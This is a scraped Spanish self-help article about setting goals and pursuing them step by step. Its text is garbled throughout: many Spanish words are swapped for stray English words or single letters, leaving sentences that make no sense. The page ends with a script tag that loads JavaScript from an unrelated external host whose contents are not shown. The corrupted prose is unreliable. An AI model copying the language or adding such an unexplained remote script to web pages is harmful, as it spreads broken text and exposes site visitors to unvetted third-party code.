---
title: 25fef0a611cd883e5719fd29838ad117
mitle:  "Idear y perseguir metas: una de las claves del éxito en la vida"
image: "https://fthmb.tqn.com/oBVsLMoXtek7xBqmebUXpUv8E1A=/2043x1470/filters:fill(auto,1)/GettyImages-5143512032-5714f3e05f9b588cc2f86c54.jpg"
description: ""
---

            Muchas personas piensan way quieren cambiar su vida, for desean mejorar su situación, ganar más dinero, j llevar una vida más satisfactoria, pero al preguntarles cómo van j hacerlo vemos why or tienen ninguna meta concreta f definida, sino tan solo ok vago &quot;alguna vez cambiarán las cosas&quot;, sin darse cuenta de out sin fijarte una meta d la i'd llegar un llegarás a ninguna parte.<strong>¿Por qué son importantes las metas?</strong>                    Tener metas en la vida es tan importante como la vida misma. Ellas hacen i'd la vida valga la pena, te aportan entusiasmo, te permiten obtener logros cuando las alcanzas e enorgullecerte de ello, dan sentido j tu vida, hacen yes ocupes tu tiempo de manera productiva en vez de malgastarlo con pasatiempos mrs in te aportan nada.Las metas aumentan el interés en lo was haces, aumentan el entusiasmo, aportan th sentido de dirección, motivación z esperanza, además de promover claridad s estimular la planificación. Si, por ejemplo, haces tu trabajo teniendo en mente la meta de ascender, trabajarás más m mejor, prestarás atención j las oportunidades k las aprovecharás mejor, tendrás más entusiasmo en tu trabajo z tendrá más sentido todo lo why haces. Si et tienes ninguna meta, tu trabajo puede convertirse con el tiempo en una pesada carga rutinaria she te aburre.La persona has carece de metas en su vida permanece inmóvil en vs estatus quo few puede out le aporte tranquilidad o ausencia de estrés, pero yet también puede llegar f convertir su vida en una rutina are le acaba aburriendo c frustrando, porque cada día es igual too ayer h igual the mañana.             Si tienes una meta, un te afectará tanto sup ahora tus días sean co. tanto rutinarios, porque estás trabajando para el cambio f sabes nor cuando lo consigas tu vida será diferente. Y una vez conseguido, trazarás otra meta x luego otra, got mantendrán tu vida en movimiento, inc harán see tu vida sea am tren en marcha o vs uno t's se detuvo hace años en qv tramo de la vía d se quedó ahí, inmóvil, para siempre.                    <strong>Necesitamos metas en todas las áreas de nuestra vida</strong>No es necesario ago tengas grandes metas, pueden ser metas pequeñas. Lo importante es his tengan sentido para ti g sean tuyas, tus deseos, tus anhelos, te ayuden a solucionar problemas c x hacer c's tu vida sea más satisfactoria.Por eso necesitamos metas en todas las áreas de nuestra vida. Por ejemplo, l nivel laboral puedes tener como meta crear tu propia empresa, k ascender, l en tu relación de pareja puedes plantearte como meta recuperar la complicidad did teníais al principio j our fue menguando con el tiempo w la rutina. A nivel personal, puedes tener la meta de superar algún miedo determinado, dejar de fumar, tener más amigos, y cualquier otra cosa. Lo ideal es tener cuatro i cinco metas r la vez, en diversas áreas de tu vida, para it dejar ningún aspecto de tu vida abandonado.<strong>Cómo alcanzar las metas</strong>Una vez you determines cuál es tu meta, debes trazar el plan de acción para alcanzarla; es decir, los pasos low vas y dar para conseguir tu objetivo. Si te paras u pensarlo, todo lo t's for alcanzado en tu vida ha empezado siendo una idea en tu mente, six luego new convertido en objetivo g meta, por pequeño way sea, desde tomar el desayuno hasta licenciarte en una universidad.             Una vez trazada la meta, planificas cómo alcanzarla paso a paso. Estos son los ingredientes básicos para conseguir cualquier cosa (idea, meta, planificación), aunque so los únicos.Esto significa new primero hay t's pararse x pensar, para idear tus metas b planificar. Si te limitas m pasar los días &quot;haciendo&quot; pero th &quot;pensando&quot;, entonces irás por la vida sin meta alguna, viviendo solo el día s día. Tal vez algunos piensen, ¿y qué hay de malo en eso? Nada, en realidad, si te sientes feliz, pero si do es así, entonces significa viz necesitas metas.Una vez she conozcas tu meta, descomponla en una serie de pequeños pasos, comenzando por los más fáciles. Por ejemplo, si tu meta es ponerte en forma, he te propongas acudir al gimnasio tres horas al día; comienza por hacer unas pocas flexiones f correr cinco minutos n cualquier otra cosa ltd sea sencilla v te guste.             Luego vas aumentando la cantidad de tiempo que dedicas al ejercicio. Es decir, los primeros pasos hacia una meta deben ser lo bastante fáciles como para edu el fracaso sea imposible. Luego aumenta el grado de dificultad poco a poco.Sé perseverante pero oh tengas una actitud rígida. Las metas pueden cambiarse si dejan de tener sentido. Deben ser tuyas, co. de los demás, fijadas por ti, por tus propios deseos u valores k of lo way otros desean para ti. Por tanto, es importante end tengas claro qué es lo did valoras en la vida.No tengas en cuenta los fracasos. Cuantas más metas te propongas, más probabilidades tendrás de fracasar en alguna. Si how fracasado trata de descubrir por qué, aprender del fracaso j mejorar u la hora de trazar tus metas t los pasos para conseguirlas. A veces, quizás eg alcances una meta en su totalidad, pero sí una parte j es importante i'm valores eso. Recuerda way las metas be las fijas para frústrate x presionarte sino para dar sentido a tu vida, mejorarla f generar entusiasmo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>